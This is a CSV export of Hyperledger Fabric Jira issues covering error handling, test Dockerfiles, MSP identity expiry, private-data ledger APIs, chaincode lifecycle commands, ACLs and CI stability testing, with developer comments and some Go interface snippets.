Implement Serviceability - Peer,FAB-5771,20181,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Won't Do,eramitg,Clayton Sims,Clayton Sims,15/Aug/17 4:05 AM,12/Jan/19 1:02 AM,28/Oct/23 3:00 AM,12/Jan/19 1:02 AM,,,,Future,,fabric-peer,,,,,,1,,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors|https://github.com/pkg/errors]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need – stacktrace – for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,denyeart,eramitg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd4n:",,,,,,,,,,,,,,,,,,,,,,,denyeart,eramitg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jan/19 1:02 AM;denyeart;Will create new Jira items for any remaining work.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create a Dockerfile to provide a 'containerized' testing environment to fabric-sdk-rest developers.,FAB-5774,20185,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jtclark,jtclark,15/Aug/17 5:37 AM,30/Jul/19 11:59 AM,28/Oct/23 3:00 AM,30/Jul/19 11:59 AM,,,,,,,,,,,,0,fabric-sdk-rest,,,,,,"In order to provide a way to conduct tests in a self-contained development environment, create a Dockerfile to be used for installing and configuring the fabric-sdk-rest project. This Dockerfile will also be used for deployment testing, unit-tests, and FVT testing.",,chrispoole,ianj_mitchell@uk.ibm.com,jtclark,MartinC,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd5b:",,,,,,,,,,,,,,,,,,,,,,,chrispoole,ianj_mitchell@uk.ibm.com,jtclark,MartinC,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/18 12:50 AM;jtclark;Status Update

===========

Discussed this task with [~MartinC]:

[~MartinC]: ""At the moment there is no dockerfile that exists to run the server in a container inside the docker network using the local version of the code. A similar dockerfile without the npm install accompanied by a version of the tests where the local code was mounted into the container would be a good step for running the tests closer to the expected runtime environment.""

[~MartinC]: ""Local testing can be done using the scripts `tests/fullRun.sh` and `tests/tlsNetworkfullRun.sh` but they run in the local environment which will be inconsistent with the base image hyperledger/fabric-baseos:x86_64-0.4.2 that will likely be used for proper deployment""

The plan (now) is to create a dockerfile that sits inside the codebase (in the `tests` directory) that’s uses the local copy of the code to stand up the fabric-sdk-rest server.;;;","26/Feb/18 11:54 PM;jtclark;*Status Update*

 

Working on getting the Dockerfile updated. Using  [https://github.ibm.com/ELISAFLA/BC-Connect/blob/master/build/fabric-sdk-rest/Dockerfile] as a reference at the suggestion of [~elisafla].;;;","26/Mar/18 10:08 PM;chrispoole;Thanks for your work on this [~jtclark].

 

As previously discussed, would be good to get an alpine-based dockerfile to stand the REST server up, and from there iterate and add environment var support for port to listen on, etc. Could do with being able to specify a connection profile document to copy in and run against, too, to make it quick to change peer addresses and stand the server up again.;;;","30/Jul/19 11:59 AM;mastersingh24;No activity in a year or more;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The byfn.sh has some error.,FAB-5776,20187,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,TopJohn,TopJohn,TopJohn,15/Aug/17 11:14 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,16/Oct/17 11:19 AM,,,,,,fabric-samples,,,,,,0,,,,,,,"Line 113 is repeated,so it caused the docker-compose some error.",,ChristopherFerris,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd5r:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Oct/17 4:43 AM;ChristopherFerris;I don't see line 113 as repeated. Possibly your version was inadvertently changed? [~TopJohn];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Preserve compatibility between 1.0 shim (no private data) and 1.1 shim (private data),FAB-5777,20188,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,denyeart,denyeart,15/Aug/17 11:49 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,06/Nov/17 8:42 PM,,,,,,,,,,,,0,,,,,,,"If shim does not get automatically upgraded in 1.1 (see FAB-5676), then we will need to preserve the old 1.0 shim proto messages and create a duplicate set of proto messages for chaincode functions using private data.",,denyeart,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzyd5z:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Nov/17 8:42 PM;denyeart;Decision has been made to delete old chaincode image upon upgrading peer to 1.1.  This will either be done via manual instructions or automatically as in FAB-5676.  Therefore this work item is no longer needed, marking as Done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
As I fabric developer I want to be able to validate MSP identities against a time reference,FAB-5778,20189,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,angelo.decaro,angelo.decaro,15/Aug/17 5:32 PM,23/Jan/20 7:01 AM,28/Oct/23 3:00 AM,23/Jan/20 7:01 AM,v1.0.1,,,,,fabric-crypto,,,,,,8,Security,stale-item,,,,,"In order to evaluate expiration of MSP Identity we need to introduce in MSP the concept of reference time and having the following two ingredients:
- A method to get the expiration reference time from an MSP identity
- A way to validate and MSP Identity with the respect to a reference time.

[~elli-androulaki], [~ales], [~yacovm], please, add comments to better clarify the purpose of this item if you think it is needed. Thanks :)",,angelo.decaro,elli-androulaki,JonathanLevi,mastersingh24,sykesm,yacovm,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-8792,,,,,,,,,"1|hzwrzj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,elli-androulaki,JonathanLevi,mastersingh24,sykesm,yacovm,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Aug/17 5:42 PM;yacovm;I need the first one for FAB-5752 . 
Without this - we have a time window that during that time - gossip would use identities that are expired without knowing it.

Also - this capability doesn't change the existing functionality - it's only an extension of an interface that isn't exposed to clients - hence no API / ABI changes.;;;","15/Aug/17 8:53 PM;mastersingh24;I'm voting for this issue, but I'd like to see semi-detailed design before actually implementing this.

For an initial phase, I still believe that we can actually use the node's local time to make decisions for what I call ""admission control"" where we don't have to worry about non-determinism.  Examples include:
 * Endorsement request from client to peer - no reason we can't just check expiration of the client's certificate when the client submits the endorsement proposal to the peer
 * Client broadcast to orderer - again same logic as above (at least in the CFT case - maybe something would need to change for fairness in a BFT case)
 * Gossip - similar to the above except peers are clients to peers
 * Signing an endorsement response - maybe we don't do this but in the case of a well-behaving peer maybe it's an easy way to avoid expired certificates

The above is not an exhaustive list, but at least a sampling.;;;","15/Aug/17 9:20 PM;yacovm;I have a semi detailed design in FAB-5752 and a [WIP implementation|https://gerrit.hyperledger.org/r/#/c/12427/1/gossip/identity/identity.go] (you can only look at the gossip part - but that's not the final code, I'm doing some refactoring so I'll be able to get rid of annoying code paths and consolidate all identity related logic to the identity package - unlike what is today) 

Essentially - all gossip needs to to be able to know when an identity expires, so we can delete it immediately from memory, and then all lookups and validations of signatures, policies related to that identity would fail.
I can implement this functionality ad-hoc, but I think that having this ability in the MSP interface is better.;;;","15/Aug/17 10:11 PM;yacovm;gathered 5 votes --> removing needed_review label;;;","16/Aug/17 3:16 AM;JonathanLevi;In accordance with [~mastersingh24] 's ask above, I would also like to see at least a semi-detailed design, let alone a detailed design (G-d bless our souls!) that everybody can iterate on/comment/ask questions/suggest/answer/clarify...

There is a related discussion here: https://jira.hyperledger.org/browse/FAB-5752

I am going to up vote this too, in the interim - but we should strive to clarify the ""scope"" of the underlying work, given that 1.1 is scheduled to be out in less than 2 months... and I note that there are some suggestions for an API change/extension that we should evaluate (and communicate, should we take that route).

 ;;;","16/Aug/17 3:17 AM;JonathanLevi;Up-voted, so that this does not get delayed. Officially, we have a majority. However, please let's address the requests above and the questions on FAB-5752... thanks.;;;","14/Mar/18 9:02 PM;elli-androulaki;So this item is now groupped into MSP refactoring epic. I label this as 1.3 but we can reconsider if work for top priorities is completed as per Dave's comment in FAB-8792.;;;","23/Jan/20 7:01 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Expose new ledger API for coordinator and committer interfaces,FAB-5779,20190,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,15/Aug/17 7:18 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,07/Sep/17 6:49 PM,,,,,,,,,,,,0,active,gossip,,,,,"In context of FAB-1151, there ledger introduced a set of new API's to support update of private data collection during chaincode invocations, as well added new API's to commit blocks atomically with private data and request private data for given block sequence:

{code}
	// GetPvtDataAndBlockByNum returns the block and the corresponding pvt data.
	// The pvt data is filtered by the list of 'ns/collections' supplied
	// A nil filter does not filter any results and causes retrieving all the pvt data for the given blockNum
	GetPvtDataAndBlockByNum(blockNum uint64, filter PvtNsCollFilter) (*BlockAndPvtData, error)
	// GetPvtDataByNum returns only the pvt data  corresponding to the given block number
	// The pvt data is filtered by the list of 'ns/collections' supplied in the filter
	// A nil filter does not filter any results and causes retrieving all the pvt data for the given blockNum
	GetPvtDataByNum(blockNum uint64, filter PvtNsCollFilter) ([]*TxPvtData, error)
	// CommitWithPvtData commits the block and the corresponding pvt data in an atomic operation
	CommitWithPvtData(blockAndPvtdata *BlockAndPvtData) error
{code} 

While taking care to replicate state, state transfer module works against coordinator, therefore coordination has to leverage new ledger capabilities to be able to request blocks with private data as well as to commit blocks with relevant private data. In order to support this requirement {{Committer}} interface need to be extended.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd67:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Aug/17 7:57 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/12467/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger to expose API to query for transient store,FAB-5780,20191,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,denyeart,C0rWin,C0rWin,15/Aug/17 7:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,07/Sep/17 6:50 PM,,,,,,fabric-ledger,,,,,,0,active,gossip,ledger,,,,"Once transaction is simulated and private read write set produced, the signed proposal returned back to the client, next client sends signed proposal for ordering service.

After ordering service cut the block and sends it back to the endorsing peer, there is a need to extract private data out of transient store which was kept during simulation in order to fulfill ledger API to commit block and private data atomically, namely 

{code}
	// CommitWithPvtData commits the block and the corresponding pvt data in an atomic operation
	CommitWithPvtData(blockAndPvtdata *BlockAndPvtData) error
{code}

",,C0rWin,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd6f:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Aug/17 5:46 AM;manish-sethi;Ledger's API that is used for simulation of a tran proposal is changed to include the pvt data. The return type of function `GetTxSimulationResults()` ([https://github.com/hyperledger/fabric/blob/master/core/ledger/ledger_interface.go#L168)] now includes the pvtdata as well, in addition to the public rwset. The endorser is to be changed to handle this pvt data. The endorser is expected to continue to sign and send the pub simulation results back to the sdk. However, in addition, the endorser is expected to

1) Persist the pvt data into the transient store (via transient coordinator APIs ?)

2) optionally, disseminate the pvt data to the other peers (the partial pvt data based on collection visibility) so that other peers also have the pvt data in advance

During commit, before calling the function `CommitWithPvtData` on ledger, the transient data coordinator fetches the pvt data from a combination of sources that include, the transient store of itself + transient data coordinator of other peer (which in turn combines the search over local transient store and committed data into the local copy of the ledger).

 

In phase-1, because of the simplified assumption (that all the peers would act as endorsers for all the transactions with pvt data), the ledger assumes that it does not need any pvt data other than the one that is produced by itself. Under this assumption, the ledger short-circuits the above described flow entirely and keeps the pvt data generated during simulation locally within ledger temp storage. During `Commit` function, the ledger pulls out the required pvt data (based on what trans are included inside the block) from this temp storage and calls the `CommitWithPvtData` function. Once, the committer/coordinator starts calling function `CommitWithPvtData` directly, we intend to get rid of the function `Commit` and the internal temp storage related code. Note, that for the internal temp storage, ledger uses an instance of the transient store - However, that should not stop the modifications in the transient coordinator/endorser/committer to start using the transient store as per above mentioned flow. Because, the ledger uses the an isolated instance of the transient store (pending this cr - [https://gerrit.hyperledger.org/r/#/c/12487/)] at entirely different filesystem path.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode peer commands - start/stop/uninstall,FAB-5781,20192,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,jiangyaoguo,jiangyaoguo,15/Aug/17 8:14 PM,21/Aug/20 3:46 AM,28/Oct/23 3:00 AM,,v1.1.0,,,Future,,fabric-peer,,,,,,3,operator,,,,,,"For now, we have package/install/instantiate/upgrade to manage chaincode's lifecycle. When upgrading chaincode, transactions of different chaincode versions may cause conflicts. Though we have handle conflicts at commiter side, to reduce conflicts, it's better to involve new chaincode "" stop"" transaction to stop chaincode endorsing service and then ""upgrade"" this chaincode . After ""upgrade"" successfully, use new ""start"" transaction to enable chaicnode endorsing.

The ""stop & start"" also help operator to disable chaincode temporarily without disable peer. For example, one peer joins two channels, chaincode on one channle produces unexpected results, which need to be fixed. Without ""stop/start"", we have to notice all peers running that chaincode off-chain to stop peer instance, which will stop other channels the peer joins.

A design doc is put at https://docs.google.com/document/d/1aSWNOuvOBzi1OzZ-b8h0IP-Qs6JL8iREXM7Jtc0VkE0/edit [,|https://docs.google.com/document/d/1aSWNOuvOBzi1OzZ-b8h0IP-Qs6JL8iREXM7Jtc0VkE0,] welcome for comments.",,AshishkumarLakshmanan,baohua,ChristopherFerris,denyeart,Hangyu_FJH,ishihara.shun,jiangyaoguo,robmurgai,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABN-621,,,,,,FAB-5954,FAB-5955,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyd6n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,AshishkumarLakshmanan,baohua,ChristopherFerris,denyeart,Hangyu_FJH,ishihara.shun,jiangyaoguo,robmurgai,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Aug/17 1:59 PM;baohua;Several cents.

At least we need implement the following basic operations, from peer perspective and channel perspective.

For peer: the chaincode (cc) can do:
 * install
 * uninstall

For channel: the cc can do:
 * instantiate (cc bootup and register for serving request)
 * de-instantiate (cc shutdown/remove and deregister, never serve request again)

The full-lifecycle is very important for product usage. Strongly support to add this as v1.1 highlighted feature.

Thoughts?;;;","29/Aug/17 5:54 PM;jiangyaoguo;The ""stop"" here is similar to ""de-instantiate"".  ""stop"" is applied to channel. The real chaincode cotnainer may still be running because other channel didn't stop this chaincode. ""stop"" will stop chaincode endorsing on specified channel. ;;;","31/Aug/17 12:07 PM;baohua;IMHO, when we do de-instantiate, it should affect all peers inside that channel?

I.e., on specific channel and specific CC, all instantiated containers should be stopped and cleaned up.;;;","31/Aug/17 12:13 PM;baohua;[~jiangyaoguo] I guess when u mentioned stop, u mean just stop a single CC container at specific peer side?

To be clear, let's discuss all required scenarios in this design doc: [https://docs.google.com/document/d/1aSWNOuvOBzi1OzZ-b8h0IP-Qs6JL8iREXM7Jtc0VkE0]

 

Welcome anyone to add ur comments/advices/requirements.;;;","18/Oct/17 11:44 PM;ChristopherFerris;[~jiangyaoguo] [~baohua] I don't see progress on this, and hence I don't think it likely that it will make 1.1. It appears that there is still not consensus on the design doc. Let's put this on the 1.2 list to be considered for planning, ok? [~denyeart];;;","30/Mar/18 2:48 AM;ChristopherFerris;I moved this to Future, but the design doc appears to be missing or moved.;;;","30/Mar/18 9:18 AM;baohua;New design doc link here:

[https://docs.google.com/document/d/1aSWNOuvOBzi1OzZ-b8h0IP-Qs6JL8iREXM7Jtc0VkE0/edit#heading=h.r5g9dt9jrpc];;;","30/Mar/18 8:43 PM;ChristopherFerris;[~baohua] this appears to be the link to the Working Group Template. Cut & Paste error I think.;;;","30/Mar/18 11:22 PM;baohua;Fixed, thanks!  :);;;","23/Jan/20 7:01 AM;sykesm;Stale;;;","21/Aug/20 3:45 AM;denyeart;Re-opening based on requests from Fabric operators.

At this point, the commands would be applied to the new v2.x lifecycle, rather than the old lscc lifecycle.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - Test CI Stability,FAB-5783,20194,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,16/Aug/17 12:34 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Nov/17 11:04 PM,,,,,,fabric-ci,,,,,,0,ci,,,,,,"Perform repetitive tests (reverify) on fabric-CI job to know the stability of the fabric CI build.

Submit a no-op CR on fabric repository and trigger jobs (reverify) for 10 times.. Capture results for every reverify and list them as tasks in JIRA.",,jyellick,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd73:",,,,,,,,,,,,,,,,,,,,,,,jyellick,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Aug/17 3:19 AM;rameshthoomu;First Attempt:

{color:#d04437}*Except ""Z"" all tests passed*{color}.. Took sandbox node offline from production CI. We are using go1.8.3 in sandbox z machine caused this failure.. (https://jenkins.hyperledger.org/job/fabric-verify-z/11290/);;;","16/Aug/17 4:33 AM;rameshthoomu;2nd Attempt:

{color:#d04437}*Except ""Z"" all tests passed.*{color} Observed build failure on z https://jenkins.hyperledger.org/job/fabric-verify-z/11316/console;;;","16/Aug/17 6:10 AM;rameshthoomu;3rd Attempt:

{color:#d04437}*WORKED AS EXPECTED*  {color:#333333}All tests are worked as expected{color}{color}

 ;;;","16/Aug/17 10:36 PM;rameshthoomu;4th Attempt:

End-2-End tests failed with build timeout error. Took 20 mins to download hyperledger/fabric-baseimage. Overall it took more than 50 mins and build aborted after configured buildtimeout (50 mins) . [https://jenkins.hyperledger.org/job/fabric-verify-end-2-end-x86_64/7247/console]

Gossip unit-tests are failed on x86_64 build node: [https://jenkins.hyperledger.org/job/fabric-verify-x86_64/15718/console]

 

 ;;;","17/Aug/17 12:09 AM;rameshthoomu;*5th Attempt:*

*{color:#d04437}End-2-End tests failed with below error.{color}*
{code:java}
00:16:09.846 Pulling peer0.org2.example.com (hyperledger/fabric-peer:latest)...
00:16:10.265 manifest for hyperledger/fabric-peer:latest not found
00:16:10.287 ERROR !!!! Unable to pull the images 
00:16:10.294 Build step 'Execute shell' marked build as failure
00:16:10.301 $ ssh-agent -k
{code}
 ;;;","17/Aug/17 11:37 PM;rameshthoomu;6th Attempt:

{color:#d04437}*PASSED*{color};;;","18/Aug/17 12:59 AM;rameshthoomu;7th Attempt

{color:#d04437}*PASSED*{color};;;","18/Aug/17 2:58 AM;rameshthoomu;8th Attempt:

{color:#d04437}*FAILED*{color} - e2e test job took more then 50 mins and caused build timeout https://jenkins.hyperledger.org/job/fabric-verify-end-2-end-x86_64/7316/console;;;","18/Aug/17 10:45 PM;rameshthoomu;9th Attempt:

{color:#d04437}*PASSED* {color};;;","19/Aug/17 3:41 AM;rameshthoomu;10th attempt:

{color:#d04437}*FAILED*{color} e2e build failed with build timeout error
 {color:#ff0000}27 {color}{color:#ff0000}33{color}{color:#ff0000}.9{color}{color:#ff0000}M {color}{color:#ff0000}  27 9633k    0     0   560k      0  0:01:02  0:00:17  0:00:45  478{color}{color:#ff0000}k{color}Build timed out (after 50 minutes). Marking the build as failed.;;;","14/Nov/17 11:04 PM;rameshthoomu;Seems CI is stable now, I see builds are failing inconsistently due to the below issues
 * Patches needs to be rebased on the latest fixes. I see most of the patches are failing in this area
 * While fetching the couchdb, zookeeper images reference from third party sites, we observed curl command is failing inconsistently. Below is the error log.

{code:java}
00:02:52.012 Step 7/15 : RUN mkdir -p /usr/share/maven /usr/share/maven/ref   && curl -fsSL http://www-us.apache.org/dist/maven/maven-3/$MAVEN_VERSION/binaries/apache-maven-$MAVEN_VERSION-bin.tar.gz     | tar -xzC /usr/share/maven --strip-components=1   && ln -s /usr/share/maven/bin/mvn /usr/bin/mvn
00:02:52.073  ---> Running in e92471f132b4
00:02:53.628 curl: (18) transfer closed with 5813293 bytes remaining to read{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement ACL on Channel Service server,FAB-5784,20196,20082,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,16/Aug/17 1:19 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Dec/17 12:56 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd7b:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 10:38 PM;wlahti;https://gerrit.hyperledger.org/r/#/c/12609/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add SignedEvent based validation support to RSCC,FAB-5785,20197,20082,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,muralisr,muralisr,16/Aug/17 1:22 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Dec/17 12:55 AM,,,,,,,,,,,,0,,,,,,,Extend RSCC's policy support to extract identity information from SignedEvent for doing CheckACL on it.  Currently RSCC supports only SignedProposal.,,muralisr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd7j:",,,,,,,,,,,,,,,,,,,,,,,muralisr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 10:37 PM;wlahti;https://gerrit.hyperledger.org/r/#/c/12483/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Temporary usage of transient store inside ledger,FAB-5787,20199,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,16/Aug/17 2:44 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 12:25 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"The transient store would ideally be used outside the ledger component. The endorser will take the simulation results and put the pvt data in the transient store. Similarly, the committer/state transfer will pull out the pvt data from the transient store (in addition to from gossip) and will call `CommitWithPvtData` on ledger.",,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd7z:",,,,,,,,,,,,,,,,,,,,,,,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Aug/17 12:25 AM;denyeart;[https://gerrit.hyperledger.org/r/#/c/12487/] merged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Chaincode Calling Chaincode using chaincode_example04, where both chaincodes are on same channel",FAB-5788,20200,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,16/Aug/17 3:36 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Sep/17 10:59 PM,,,,,,,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd87:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:59 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"test marbles02 chaincode for : initMarble, readMarble, transferMarble, transferMarblesBasedOnColor",FAB-5789,20201,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,16/Aug/17 3:39 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Sep/17 11:01 PM,,,,,,,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd8f:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:59 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
